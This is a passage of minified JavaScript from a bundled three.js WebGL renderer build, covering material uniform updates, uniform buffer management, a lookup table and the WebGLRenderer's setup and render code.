wt=D[Tt],_t=U[Tt];wt!==null&&_t!==void 0&&_t.update(wt,ut,p||d)}z&&z(Y,ut),ut.detectedPlanes&&s.dispatchEvent({type:"planesdetected",data:ut}),T=null}const At=new oS;At.setAnimationLoop(pt),this.setAnimationLoop=function(Y){z=Y},this.dispose=function(){}}}const w3=new cn,pS=new de;pS.set(-1,0,0,0,1,0,0,0,1);function N3(o,e){function i(y,S){y.matrixAutoUpdate===!0&&y.updateMatrix(),S.value.copy(y.matrix)}function s(y,S){S.color.getRGB(y.fogColor.value,aS(o)),S.isFog?(y.fogNear.value=S.near,y.fogFar.value=S.far):S.isFogExp2&&(y.fogDensity.value=S.density)}function c(y,S,N,B,C){S.isNodeMaterial?S.uniformsNeedUpdate=!1:S.isMeshBasicMaterial?f(y,S):S.isMeshLambertMaterial?(f(y,S),S.envMap&&(y.envMapIntensity.value=S.envMapIntensity)):S.isMeshToonMaterial?(f(y,S),v(y,S)):S.isMeshPhongMaterial?(f(y,S),x(y,S),S.envMap&&(y.envMapIntensity.value=S.envMapIntensity)):S.isMeshStandardMaterial?(f(y,S),_(y,S),S.isMeshPhysicalMaterial&&E(y,S,C)):S.isMeshMatcapMaterial?(f(y,S),T(y,S)):S.isMeshDepthMaterial?f(y,S):S.isMeshDistanceMaterial?(f(y,S),w(y,S)):S.isMeshNormalMaterial?f(y,S):S.isLineBasicMaterial?(d(y,S),S.isLineDashedMaterial&&h(y,S)):S.isPointsMaterial?m(y,S,N,B):S.isSpriteMaterial?p(y,S):S.isShadowMaterial?(y.color.value.copy(S.color),y.opacity.value=S.opacity):S.isShaderMaterial&&(S.uniformsNeedUpdate=!1)}function f(y,S){y.opacity.value=S.opacity,S.color&&y.diffuse.value.copy(S.color),S.emissive&&y.emissive.value.copy(S.emissive).multiplyScalar(S.emissiveIntensity),S.map&&(y.map.value=S.map,i(S.map,y.mapTransform)),S.alphaMap&&(y.alphaMap.value=S.alphaMap,i(S.alphaMap,y.alphaMapTransform)),S.bumpMap&&(y.bumpMap.value=S.bumpMap,i(S.bumpMap,y.bumpMapTransform),y.bumpScale.value=S.bumpScale,S.side===Jn&&(y.bumpScale.value*=-1)),S.normalMap&&(y.normalMap.value=S.normalMap,i(S.normalMap,y.normalMapTransform),y.normalScale.value.copy(S.normalScale),S.side===Jn&&y.normalScale.value.negate()),S.displacementMap&&(y.displacementMap.value=S.displacementMap,i(S.displacementMap,y.displacementMapTransform),y.displacementScale.value=S.displacementScale,y.displacementBias.value=S.displacementBias),S.emissiveMap&&(y.emissiveMap.value=S.emissiveMap,i(S.emissiveMap,y.emissiveMapTransform)),S.specularMap&&(y.specularMap.value=S.specularMap,i(S.specularMap,y.specularMapTransform)),S.alphaTest>0&&(y.alphaTest.value=S.alphaTest);const N=e.get(S),B=N.envMap,C=N.envMapRotation;B&&(y.envMap.value=B,y.envMapRotation.value.setFromMatrix4(w3.makeRotationFromEuler(C)).transpose(),B.isCubeTexture&&B.isRenderTargetTexture===!1&&y.envMapRotation.value.premultiply(pS),y.reflectivity.value=S.reflectivity,y.ior.value=S.ior,y.refractionRatio.value=S.refractionRatio),S.lightMap&&(y.lightMap.value=S.lightMap,y.lightMapIntensity.value=S.lightMapIntensity,i(S.lightMap,y.lightMapTransform)),S.aoMap&&(y.aoMap.value=S.aoMap,y.aoMapIntensity.value=S.aoMapIntensity,i(S.aoMap,y.aoMapTransform))}function d(y,S){y.diffuse.value.copy(S.color),y.opacity.value=S.opacity,S.map&&(y.map.value=S.map,i(S.map,y.mapTransform))}function h(y,S){y.dashSize.value=S.dashSize,y.totalSize.value=S.dashSize+S.gapSize,y.scale.value=S.scale}function m(y,S,N,B){y.diffuse.value.copy(S.color),y.opacity.value=S.opacity,y.size.value=S.size*N,y.scale.value=B*.5,S.map&&(y.map.value=S.map,i(S.map,y.uvTransform)),S.alphaMap&&(y.alphaMap.value=S.alphaMap,i(S.alphaMap,y.alphaMapTransform)),S.alphaTest>0&&(y.alphaTest.value=S.alphaTest)}function p(y,S){y.diffuse.value.copy(S.color),y.opacity.value=S.opacity,y.rotation.value=S.rotation,S.map&&(y.map.value=S.map,i(S.map,y.mapTransform)),S.alphaMap&&(y.alphaMap.value=S.alphaMap,i(S.alphaMap,y.alphaMapTransform)),S.alphaTest>0&&(y.alphaTest.value=S.alphaTest)}function x(y,S){y.specular.value.copy(S.specular),y.shininess.value=Math.max(S.shininess,1e-4)}function v(y,S){S.gradientMap&&(y.gradientMap.value=S.gradientMap)}function _(y,S){y.metalness.value=S.metalness,S.metalnessMap&&(y.metalnessMap.value=S.metalnessMap,i(S.metalnessMap,y.metalnessMapTransform)),y.roughness.value=S.roughness,S.roughnessMap&&(y.roughnessMap.value=S.roughnessMap,i(S.roughnessMap,y.roughnessMapTransform)),S.envMap&&(y.envMapIntensity.value=S.envMapIntensity)}function E(y,S,N){y.ior.value=S.ior,S.sheen>0&&(y.sheenColor.value.copy(S.sheenColor).multiplyScalar(S.sheen),y.sheenRoughness.value=S.sheenRoughness,S.sheenColorMap&&(y.sheenColorMap.value=S.sheenColorMap,i(S.sheenColorMap,y.sheenColorMapTransform)),S.sheenRoughnessMap&&(y.sheenRoughnessMap.value=S.sheenRoughnessMap,i(S.sheenRoughnessMap,y.sheenRoughnessMapTransform))),S.clearcoat>0&&(y.clearcoat.value=S.clearcoat,y.clearcoatRoughness.value=S.clearcoatRoughness,S.clearcoatMap&&(y.clearcoatMap.value=S.clearcoatMap,i(S.clearcoatMap,y.clearcoatMapTransform)),S.clearcoatRoughnessMap&&(y.clearcoatRoughnessMap.value=S.clearcoatRoughnessMap,i(S.clearcoatRoughnessMap,y.clearcoatRoughnessMapTransform)),S.clearcoatNormalMap&&(y.clearcoatNormalMap.value=S.clearcoatNormalMap,i(S.clearcoatNormalMap,y.clearcoatNormalMapTransform),y.clearcoatNormalScale.value.copy(S.clearcoatNormalScale),S.side===Jn&&y.clearcoatNormalScale.value.negate())),S.dispersion>0&&(y.dispersion.value=S.dispersion),S.retroreflectivity>0&&(y.retroreflectivity.value=S.retroreflectivity),S.iridescence>0&&(y.iridescence.value=S.iridescence,y.iridescenceIOR.value=S.iridescenceIOR,y.iridescenceThicknessMinimum.value=S.iridescenceThicknessRange[0],y.iridescenceThicknessMaximum.value=S.iridescenceThicknessRange[1],S.iridescenceMap&&(y.iridescenceMap.value=S.iridescenceMap,i(S.iridescenceMap,y.iridescenceMapTransform)),S.iridescenceThicknessMap&&(y.iridescenceThicknessMap.value=S.iridescenceThicknessMap,i(S.iridescenceThicknessMap,y.iridescenceThicknessMapTransform))),S.transmission>0&&(y.transmission.value=S.transmission,y.transmissionSamplerMap.value=N.texture,y.transmissionSamplerSize.value.set(N.width,N.height),S.transmissionMap&&(y.transmissionMap.value=S.transmissionMap,i(S.transmissionMap,y.transmissionMapTransform)),y.thickness.value=S.thickness,S.thicknessMap&&(y.thicknessMap.value=S.thicknessMap,i(S.thicknessMap,y.thicknessMapTransform)),y.attenuationDistance.value=S.attenuationDistance,y.attenuationColor.value.copy(S.attenuationColor)),S.anisotropy>0&&(y.anisotropyVector.value.set(S.anisotropy*Math.cos(S.anisotropyRotation),S.anisotropy*Math.sin(S.anisotropyRotation)),S.anisotropyMap&&(y.anisotropyMap.value=S.anisotropyMap,i(S.anisotropyMap,y.anisotropyMapTransform))),y.specularIntensity.value=S.specularIntensity,y.specularColor.value.copy(S.specularColor),S.specularColorMap&&(y.specularColorMap.value=S.specularColorMap,i(S.specularColorMap,y.specularColorMapTransform)),S.specularIntensityMap&&(y.specularIntensityMap.value=S.specularIntensityMap,i(S.specularIntensityMap,y.specularIntensityMapTransform))}function T(y,S){S.matcap&&(y.matcap.value=S.matcap)}function w(y,S){const N=e.get(S).light;y.referencePosition.value.setFromMatrixPosition(N.matrixWorld),y.nearDistance.value=N.shadow.camera.near,y.farDistance.value=N.shadow.camera.far}return{refreshFogUniforms:s,refreshMaterialUniforms:c}}function D3(o,e,i,s){let c={},f={},d=[];const h=o.getParameter(o.MAX_UNIFORM_BUFFER_BINDINGS);function m(C,U){const D=U.program;s.uniformBlockBinding(C,D)}function p(C,U){let D=c[C.id];D===void 0&&(y(C),D=x(C),c[C.id]=D,C.addEventListener("dispose",N));const P=U.program;s.updateUBOMapping(C,P);const b=e.render.frame;f[C.id]!==b&&(_(C),f[C.id]=b)}function x(C){const U=v();C.__bindingPointIndex=U;const D=o.createBuffer(),P=C.__size,b=C.usage;return o.bindBuffer(o.UNIFORM_BUFFER,D),o.bufferData(o.UNIFORM_BUFFER,P,b),o.bindBuffer(o.UNIFORM_BUFFER,null),o.bindBufferBase(o.UNIFORM_BUFFER,U,D),D}function v(){for(let C=0;C<h;C++)if(d.indexOf(C)===-1)return d.push(C),C;return Ie("WebGLRenderer: Maximum number of simultaneously usable uniforms groups reached."),0}function _(C){const U=c[C.id],D=C.uniforms,P=C.__cache;o.bindBuffer(o.UNIFORM_BUFFER,U);for(let b=0,L=D.length;b<L;b++){const F=D[b];if(Array.isArray(F))for(let V=0,$=F.length;V<$;V++)E(F[V],b,V,P);else E(F,b,0,P)}o.bindBuffer(o.UNIFORM_BUFFER,null)}function E(C,U,D,P){if(w(C,U,D,P)===!0){const b=C.__offset,L=C.value;if(Array.isArray(L)){let F=0;for(let V=0;V<L.length;V++){const $=L[V],ft=S($);T($,C.__data,F),typeof $!="number"&&typeof $!="boolean"&&!$.isMatrix3&&!ArrayBuffer.isView($)&&(F+=ft.storage/Float32Array.BYTES_PER_ELEMENT)}}else T(L,C.__data,0);o.bufferSubData(o.UNIFORM_BUFFER,b,C.__data)}}function T(C,U,D){typeof C=="number"||typeof C=="boolean"?U[0]=C:C.isMatrix3?(U[0]=C.elements[0],U[1]=C.elements[1],U[2]=C.elements[2],U[3]=0,U[4]=C.elements[3],U[5]=C.elements[4],U[6]=C.elements[5],U[7]=0,U[8]=C.elements[6],U[9]=C.elements[7],U[10]=C.elements[8],U[11]=0):ArrayBuffer.isView(C)?U.set(new C.constructor(C.buffer,C.byteOffset,U.length)):C.toArray(U,D)}function w(C,U,D,P){const b=C.value,L=U+"_"+D;if(P[L]===void 0)return typeof b=="number"||typeof b=="boolean"?P[L]=b:ArrayBuffer.isView(b)?P[L]=b.slice():P[L]=b.clone(),!0;{const F=P[L];if(typeof b=="number"||typeof b=="boolean"){if(F!==b)return P[L]=b,!0}else{if(ArrayBuffer.isView(b))return!0;if(F.equals(b)===!1)return F.copy(b),!0}}return!1}function y(C){const U=C.uniforms;let D=0;const P=16;for(let L=0,F=U.length;L<F;L++){const V=Array.isArray(U[L])?U[L]:[U[L]];for(let $=0,ft=V.length;$<ft;$++){const j=V[$],et=Array.isArray(j.value)?j.value:[j.value];for(let q=0,W=et.length;q<W;q++){const ht=et[q],lt=S(ht),mt=D%P,gt=mt%lt.boundary,Bt=mt+gt;D+=gt,Bt!==0&&P-Bt<lt.storage&&(D+=P-Bt),j.__data=new Float32Array(lt.storage/Float32Array.BYTES_PER_ELEMENT),j.__offset=D,D+=lt.storage}}}const b=D%P;return b>0&&(D+=P-b),C.__size=D,C.__cache={},this}function S(C){const U={boundary:0,storage:0};return typeof C=="number"||typeof C=="boolean"?(U.boundary=4,U.storage=4):C.isVector2?(U.boundary=8,U.storage=8):C.isVector3||C.isColor?(U.boundary=16,U.storage=12):C.isVector4?(U.boundary=16,U.storage=16):C.isMatrix3?(U.boundary=48,U.storage=48):C.isMatrix4?(U.boundary=64,U.storage=64):C.isTexture?se("WebGLRenderer: Texture samplers can not be part of an uniforms group."):ArrayBuffer.isView(C)?(U.boundary=16,U.storage=C.byteLength):se("WebGLRenderer: Unsupported uniform value type.",C),U}function N(C){const U=C.target;U.removeEventListener("dispose",N);const D=d.indexOf(U.__bindingPointIndex);d.splice(D,1),o.deleteBuffer(c[U.id]),delete c[U.id],delete f[U.id]}function B(){for(const C in c)o.deleteBuffer(c[C]);d=[],c={},f={}}return{bind:m,update:p,dispose:B}}const U3=new Uint16Array([12469,15057,12620,14925,13266,14620,13807,14376,14323,13990,14545,13625,14713,13328,14840,12882,14931,12528,14996,12233,15039,11829,15066,11525,15080,11295,15085,10976,15082,10705,15073,10495,13880,14564,13898,14542,13977,14430,14158,14124,14393,13732,14556,13410,14702,12996,14814,12596,14891,12291,14937,11834,14957,11489,14958,11194,14943,10803,14921,10506,14893,10278,14858,9960,14484,14039,14487,14025,14499,13941,14524,13740,14574,13468,14654,13106,14743,12678,14818,12344,14867,11893,14889,11509,14893,11180,14881,10751,14852,10428,14812,10128,14765,9754,14712,9466,14764,13480,14764,13475,14766,13440,14766,13347,14769,13070,14786,12713,14816,12387,14844,11957,14860,11549,14868,11215,14855,10751,14825,10403,14782,10044,14729,9651,14666,9352,14599,9029,14967,12835,14966,12831,14963,12804,14954,12723,14936,12564,14917,12347,14900,11958,14886,11569,14878,11247,14859,10765,14828,10401,14784,10011,14727,9600,14660,9289,14586,8893,14508,8533,15111,12234,15110,12234,15104,12216,15092,12156,15067,12010,15028,11776,14981,11500,14942,11205,14902,10752,14861,10393,14812,9991,14752,9570,14682,9252,14603,8808,14519,8445,14431,8145,15209,11449,15208,11451,15202,11451,15190,11438,15163,11384,15117,11274,15055,10979,14994,10648,14932,10343,14871,9936,14803,9532,14729,9218,14645,8742,14556,8381,14461,8020,14365,7603,15273,10603,15272,10607,15267,10619,15256,10631,15231,10614,15182,10535,15118,10389,15042,10167,14963,9787,14883,9447,14800,9115,14710,8665,14615,8318,14514,7911,14411,7507,14279,7198,15314,9675,15313,9683,15309,9712,15298,9759,15277,9797,15229,9773,15166,9668,15084,9487,14995,9274,14898,8910,14800,8539,14697,8234,14590,7790,14479,7409,14367,7067,14178,6621,15337,8619,15337,8631,15333,8677,15325,8769,15305,8871,15264,8940,15202,8909,15119,8775,15022,8565,14916,8328,14804,8009,14688,7614,14569,7287,14448,6888,14321,6483,14088,6171,15350,7402,15350,7419,15347,7480,15340,7613,15322,7804,15287,7973,15229,8057,15148,8012,15046,7846,14933,7611,14810,7357,14682,7069,14552,6656,14421,6316,14251,5948,14007,5528,15356,5942,15356,5977,15353,6119,15348,6294,15332,6551,15302,6824,15249,7044,15171,7122,15070,7050,14949,6861,14818,6611,14679,6349,14538,6067,14398,5651,14189,5311,13935,4958,15359,4123,15359,4153,15356,4296,15353,4646,15338,5160,15311,5508,15263,5829,15188,6042,15088,6094,14966,6001,14826,5796,14678,5543,14527,5287,14377,4985,14133,4586,13869,4257,15360,1563,15360,1642,15358,2076,15354,2636,15341,3350,15317,4019,15273,4429,15203,4732,15105,4911,14981,4932,14836,4818,14679,4621,14517,4386,14359,4156,14083,3795,13808,3437,15360,122,15360,137,15358,285,15355,636,15344,1274,15322,2177,15281,2765,15215,3223,15120,3451,14995,3569,14846,3567,14681,3466,14511,3305,14344,3121,14037,2800,13753,2467,15360,0,15360,1,15359,21,15355,89,15346,253,15325,479,15287,796,15225,1148,15133,1492,15008,1749,14856,1882,14685,1886,14506,1783,14324,1608,13996,1398,13702,1183]);let ea=null;function L3(){return ea===null&&(ea=new yb(U3,16,16,jr,oa),ea.name="DFG_LUT",ea.minFilter=In,ea.magFilter=In,ea.wrapS=Na,ea.wrapT=Na,ea.generateMipmaps=!1,ea.needsUpdate=!0),ea}class O3{constructor(e={}){const{canvas:i=jE(),context:s=null,depth:c=!0,stencil:f=!1,alpha:d=!1,antialias:h=!1,premultipliedAlpha:m=!0,preserveDrawingBuffer:p=!1,powerPreference:x="default",failIfMajorPerformanceCaveat:v=!1,reversedDepthBuffer:_=!1,outputBufferType:E=Ai}=e;this.isWebGLRenderer=!0;let T;if(s!==null){if(typeof WebGLRenderingContext<"u"&&s instanceof WebGLRenderingContext)throw new Error("THREE.WebGLRenderer: WebGL 1 is not supported since r163.");T=s.getContextAttributes().alpha}else T=d;const w=E,y=new Set([Qp,jp,Kp]),S=new Set([Ai,sa,vl,xl,Yp,Zp]),N=new Uint32Array(4),B=new Int32Array(4),C=new it;let U=null,D=null;const P=[],b=[];let L=null;this.domElement=i,this.debug={checkShaderErrors:!0,diagnostics:{keywords:!1},onShaderError:null},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.toneMapping=ra,this.toneMappingExposure=1,this.transmissionResolutionScale=1;const F=this;let V=!1,$=null,ft=null,j=null,et=null;this._outputColorSpace=bi;let q=0,W=0,ht=null,lt=-1,mt=null;const gt=new ln,Bt=new ln;let Ut=null;const z=new ze(0);let pt=0,At=i.width,Y=i.height,ut=1,Tt=null,wt=null;const _t=new ln(0,0,At,Y),Rt=new ln(0,0,At,Y);let Le=!1;const le=new $x;let ge=!1,Se=!1;const ee=new cn,ie=new it,Ve=new ln,fn={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};let Pe=!1;function $e(){return ht===null?ut:1}let k=s;function en(A,H){return i.getContext(A,H)}let Oe,O,M,tt,ot,vt,Ct,Lt,xt,Et,Dt,$t,Ft,zt,Wt,ne,ce,X,Nt,Mt,Ot,kt,bt;try{const A={alpha:!0,depth:c,stencil:f,antialias:h,premultipliedAlpha:m,preserveDrawingBuffer:p,powerPreference:x,failIfMajorPerformanceCaveat:v};if("setAttribute"in i&&i.setAttribute("data-engine",`three.js r${Wp}`),i.addEventListener("webglcontextlost",Re,!1),i.addEventListener("webglcontextrestored",ue,!1),i.addEventListener("webglcontextcreationerror",ti,!1),k===null){const H="webgl2";if(k=en(H,A),k===null)throw en(H)?new Error("THREE.WebGLRenderer: Error creating WebGL context with your selected attributes."):new Error("THREE.WebGLRenderer: Error creating WebGL context.")}Jt()}catch(A){throw i.removeEventListener("webglcontextlost",Re,!1),i.removeEventListener("webglcontextrestored",ue,!1),i.removeEventListener("webglcontextcreationerror",ti,!1),Ie("WebGLRenderer: "+A.message),A}function Jt(){Oe=new LA(k),Oe.init(),Ot=new b3(k,Oe),O=new EA(k,Oe,e,Ot),M=new M3(k,Oe),O.reversedDepthBuffer&&_&&M.buffers.depth.setReversed(!0),ft=k.createFramebuffer(),j=k.createFramebuffer(),et=k.createFramebuffer(),tt=new IA(k),ot=new l3,vt=new E3(k,Oe,M,ot,O,Ot,tt),Ct=new UA(F),Lt=new Bb(k),kt=new yA(k,Lt),xt=new OA(k,Lt,tt,kt),Et=new BA(k,xt,Lt,kt,tt),X=new zA(k,O,vt),Wt=new bA(ot),Dt=new o3(F,Ct,Oe,O,kt,Wt),$t=new N3(F,ot),Ft=new u3,zt=new g3(Oe),ce=new SA(F,Ct,M,Et,T,m),ne=new y3(F,Et,O),bt=new D3(k,tt,O,M),Nt=new MA(k,Oe,tt),Mt=new PA(k,Oe,tt),tt.programs=Dt.programs,F.capabilities=O,F.extensions=Oe,F.properties=ot,F.renderLists=Ft,F.shadowMap=ne,F.state=M,F.info=tt}w!==Ai&&(L=new HA(w,i.width,i.height,h,c,f));const Xt=new C3(F,k);this.xr=Xt,this.getContext=function(){return k},this.getContextAttributes=function(){return k.getContextAttributes()},this.forceContextLoss=function(){const A=Oe.get("WEBGL_lose_context");A&&A.loseContext()},this.forceContextRestore=function(){const A=Oe.get("WEBGL_lose_context");A&&A.restoreContext()},this.getPixelRatio=function(){return ut},this.setPixelRatio=function(A){A!==void 0&&(ut=A,this.setSize(At,Y,!1))},this.getSize=function(A){return A.set(At,Y)},this.setSize=function(A,H,dt=!0){if(Xt.isPresenting){se("WebGLRenderer: Can't change size while VR device is presenting.");return}At=A,Y=H,i.width=Math.floor(A*ut),i.height=Math.floor(H*ut),dt===!0&&(i.style.width=A+"px",i.style.height=H+"px"),L!==null&&L.setSize(i.width,i.height),this.setViewport(0,0,A,H)},this.getDrawingBufferSize=function(A){return A.set(At*ut,Y*ut).floor()},this.setDrawingBufferSize=function(A,H,dt){At=A,Y=H,ut=dt,i.width=Math.floor(A*dt),i.height=Math.floor(H*dt),this.setViewport(0,0,A,H)},this.setEffects=function(A){if(w===Ai){Ie("WebGLRenderer: setEffects() requires outputBufferType set to HalfFloatType or FloatType.");return}if(A){for(let H=0;H<A.length;H++)if(A[H].isOutputPass===!0){se("WebGLRenderer: OutputPass is not needed in setEffects(). Tone mapping and color space conversion are applied automatically.");break}}L.setEffects(A||[])},this.getCurrentViewport=function(A){return A.copy(gt)},this.getViewport=function(A){return A.copy(_t)},this.setViewport=function(A,H,dt,at){A.isVector4?_t.set(A.x,A.y,A.z,A.w):_t.set(A,H,dt,at),M.viewport(gt.copy(_t).multiplyScalar(ut).round())},this.getScissor=function(A){return A.copy(Rt)},this.setScissor=function(A,H,dt,at){A.isVector4?Rt.set(A.x,A.y,A.z,A.w):Rt.set(A,H,dt,at),M.scissor(Bt.copy(Rt).multiplyScalar(ut).round())},this.getScissorTest=function(){return Le},this.setScissorTest=function(A){M.setScissorTest(Le=A)},this.setOpaqueSort=function(A){Tt=A},this.setTransparentSort=function(A){wt=A},this.getClearColor=function(A){return A.copy(ce.getClearColor())},this.setClearColor=function(){ce.setClearColor(...arguments)},this.getClearAlpha=function(){return ce.getClearAlpha()},this.setClearAlpha=function(){ce.setClearAlpha(...arguments)},this.clear=function(A=!0,H=!0,dt=!0){let at=0;if(A){let rt=!1;if(ht!==null){const Ht=ht.texture.format;rt=y.has(Ht)}if(rt){const Ht=ht.texture.type,qt=S.has(Ht),Pt=ce.getClearColor(),Kt=ce.getClearAlpha(),jt=Pt.r,re=Pt.g,fe=Pt.b;qt?(N[0]=jt,N[1]=re,N[2]=fe,N[3]=Kt,k.clearBufferuiv(k.COLOR,0,N)):(B[0]=jt,B[1]=re,B[2]=fe,B[3]=Kt,k.clearBufferiv(k.COLOR,0,B))}else at|=k.COLOR_BUFFER_BIT}H&&(at|=k.DEPTH_BUFFER_BIT,this.state.buffers.depth.setMask(!0)),dt&&(at|=k.STENCIL_BUFFER_BIT,this.state.buffers.stencil.setMask(4294967295)),at!==0&&k.clear(at)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.setNodesHandler=function(A){A.setRenderer(this),$=A},this.dispose=function(){i.removeEventListener("webglcontextlost",Re,!1),i.removeEventListener("webglcontextrestored",ue,!1),i.removeEventListener("webglcontextcreationerror",ti,!1),ce.dispose(),Ft.dispose(),zt.dispose(),ot.dispose(),Ct.dispose(),Et.dispose(),kt.dispose(),bt.dispose(),Dt.dispose(),Xt.dispose(),Xt.removeEventListener("sessionstart",vr),Xt.removeEventListener("sessionend",za),Hi.stop()};function Re(A){A.preventDefault(),Cv("WebGLRenderer: Context Lost."),V=!0}function ue(){Cv("WebGLRenderer: Context Restored."),V=!1;const A=tt.autoReset,H=ne.enabled,dt=ne.autoUpdate,at=ne.needsUpdate,rt=ne.type;Jt(),tt.autoReset=A,ne.enabled=H,ne.autoUpdate=dt,ne.needsUpdate=at,ne.type=rt}function ti(A){Ie("WebGLRenderer: A WebGL context could not be created. Reason: ",A.statusMessage)}function di(A){const H=A.target;H.removeEventListener("dispose",di),Hu(H)}function Hu(A){$r(A),ot.remove(A)}function $r(A){const H=ot.get(A).programs;H!==void 0&&(H.forEach(function(dt){Dt.releaseProgram(dt)}),A.isShaderMaterial&&Dt.releaseShaderCache(A))}this.renderBufferDirect=function(A,H,dt,at,rt,Ht){H===null&&(H=fn);const qt=rt.isMesh&&rt.matrixWorld.determinantAffine()<0,Pt=po(A,H,dt,at,rt);M.setMaterial(at,qt);let Kt=dt.index,jt=1;if(at.wireframe===!0){if(Kt=xt.getWireframeAttribute(dt),Kt===void 0)return;jt=2}const re=dt.drawRange,fe=dt.attributes.position;let Yt=re.start*jt,ye=(re.start+re.count)*jt;Ht!==null&&(Yt=Math.max(Yt,Ht.start*jt),ye=Math.min(ye,(Ht.start+Ht.count)*jt)),Kt!==null?(Yt=Math.max(Yt,0),ye=Math.min(ye,Kt.count)):fe!=null&&(Yt=Math.max(Yt,0),ye=Math.min(ye,fe.count));const _e=ye-Yt;if(_e<0||_e===1/0)return;kt.setup(rt,at,Pt,dt,Kt);let Ye,He=Nt;if(Kt!==null&&(Ye=Lt.get(Kt),He=Mt,He.setIndex(Ye)),rt.isMesh)at.wireframe===!0?(M.setLineWidth(at.wireframeLinewidth*$e()),He.setMode(k.LINES)):He.setMode(k.TRIANGLES);else if(rt.isLine){let vn=at.linewidth;vn===void 0&&(vn=1),M.setLineWidth(vn*$e()),rt.isLineSegments?He.setMode(k.LINES):rt.isLineLoop?He.setMode(k.LINE_LOOP):He.setMode(k.LINE_STRIP)}else rt.isPoints?He.setMode(k.POINTS):rt.isSprite&&He.setMode(k.TRIANGLES);if(rt.isBatchedMesh)if(Oe.get("WEBGL_multi_draw"))He.renderMultiDraw(rt._multiDrawStarts,rt._multiDrawCounts,rt._multiDrawCount);else{const vn=rt._multiDrawStarts,Gt=rt._multiDrawCounts,an=rt._multiDrawCount,Ce=Kt?Lt.get(Kt).bytesPerElement:1,zn=ot.get(at).currentProgram.getUniforms();for(let ei=0;ei<an;ei++)zn.setValue(k,"_gl_DrawID",ei),He.render(vn[ei]/Ce,Gt[ei])}else if(rt.isInstancedMesh)He.renderInstances(Yt,_e,rt.count);else if(dt.isInstancedBufferGeometry){const vn=dt._maxInstanceCount!==void 0?dt._maxInstanceCount:1/0,Gt=Math.min(dt.instanceCount,vn);He.renderInstances(Yt,_e,Gt)}else He.render(Yt,_e)};function _r(A,H,dt,at){$!==null&&A.isNodeMaterial&&$.setObject(at,A),ge===!0&&Wt.setState(A,dt,!1),A.transparent===!0&&A.side===wa&&A.forceSinglePass===!1?(A.side=Jn,A.needsUpdate=!0,xr(A,H,at),A.side=Zr,A.needsUpdate=!0,xr(A,H,at),A.side=wa):xr(A,H,at)}this.compile=function(A,H,dt=null){dt===null&&(dt=A),$!==null&&$.renderStart(A,H,dt),D=zt.get(dt),D.init(H),b.push(D),dt.traverseVisible(function(rt){rt.isLight&&rt.layers.test(H.layers)&&(D.pushLight(rt),rt.castShadow&&D.pushShadow(rt))}),A!==dt&&A.traverseVisible(function(rt){rt.isLight&&rt.layers.test(H.layers)&&(D.pushLight(rt),rt.castShadow&&D.pushShadow(rt))}),D.setupLights(),$!==null&&$.updateLights(D.state.lightsArray),Se=this.localClippingEnabled,ge=Wt.init(this.clippingPlanes,Se),ge===!0&&Wt.setGlobalState(this.clippingPlanes,H),$!==null&&ne.render(D.state.shadowsArray,dt,H);const at=new Set;return A.traverse(function(rt){if(!(rt.isMesh||rt.isPoints||rt.isLine||rt.isSprite))return;const Ht=rt.material;if(Ht)if(Array.isArray(Ht))for(let qt=0;qt<Ht.length;qt++){const Pt=Ht[qt];_r(Pt,dt,H,rt),at.add(Pt)}else _r(Ht,dt,H,rt),at.add(Ht)}),D=b.pop(),$!==null&&$.renderEnd(),at},this.compileAsync=function(A,H,dt=null){const at=this.compile(A,H,dt);return new Promise(rt=>{function Ht(){if(at.forEach(function(qt){const Kt=ot.get(qt).currentProgram;(Kt===void 0||Kt.isReady())&&at.delete(qt)}),at.size===0){rt(A);return}setTimeout(Ht,10)}Oe.get("KHR_parallel_shader_compile")!==null?Ht():setTimeout(Ht,10)})};let Ia=null;function ca(A){Ia&&Ia(A)}function vr(){Hi.stop()}function za(){Hi.start()}const Hi=new oS;Hi.setAnimationLoop(ca),typeof self<"u"&&Hi.setContext(self),this.setAnimationLoop=function(A){Ia=A,Xt.setAnimationLoop(A),A===null?Hi.stop():Hi.start()},Xt.addEventListener("sessionstart",vr),Xt.addEventListener("sessionend",za),this.render=function(A,H){if(H!==void 0&&H.isCamera!==!0){Ie("WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}if(V===!0)return;$!==null&&$.renderStart(A,H);const dt=Xt.enabled===!0&&Xt.isPresenting===!0,at=L!==null&&(ht===null||dt)&&L.begin(F,ht);if(A.matrixWorldAutoUpdate===!0&&A.updateMatrixWorld(),H.parent===null&&H.matrixWorldAutoUpdate===!0&&H.updateMatrixWorld(),Xt.enabled===!0&&Xt.isPresenting===!0&&(L===null||L.isCompositing()===!1)&&(Xt.cameraAutoUpdate===!0&&Xt.updateCamera(H),H=Xt.getCamera()),A.isScene===!0&&A.onBeforeRender(F,A,H,ht),D=zt.get(A,b.length),D.init(H),D.state.textureUnits=vt.getTextureUnits(),b.push(D),ee.multiplyMatrices(H.projectionMatrix,H.matrixWorldInverse),le.setFromProjectionMatrix(ee,aa,H.reversedDepth),Se=this.localClippingEnabled,ge=Wt.init(this.clippingPlanes,Se),U=Ft.get(A,P.length),U.init(),P.push(U),Xt.enabled===!0&&Xt.isPresenting===!0){const qt=F.xr.getDepthSensingMesh();qt!==null&&lo(qt,H,-1/0,F.sortObjects)}lo(A,H,0,F.sortObjects),U.finish(),$!==null&&$.updateLights(D.state.lightsArray),F.sortObjects===!0&&U.sort(Tt,wt),Pe=Xt.enabled===!1||Xt.isPresenting===!1||Xt.hasDepthSensing()===!1,Pe&&ce.addToRenderList(U,A),this.info.render.frame++,this.info.autoReset===!0&&this.info.reset(),ge===!0&&Wt.beginShadows();const rt=D.state.shadowsArray;if(ne.render(rt,A,H),ge===!0&&Wt.endShadows(),(at&&L.hasRenderPass())===!1){const qt=U.opaque,Pt=U.transmissive;if(D.setupLights(),H.isArrayCamera){const Kt=H.cameras;if(Pt.length>0)for(let jt=0,re=Kt.length;jt<re;jt++){const fe=Kt[jt];ts(qt,Pt,A,fe)}Pe&&ce.render(A);for(let jt=0,re=Kt.length;jt<re;jt++){const fe=Kt[jt];co(U,A,fe,fe.viewport)}}else 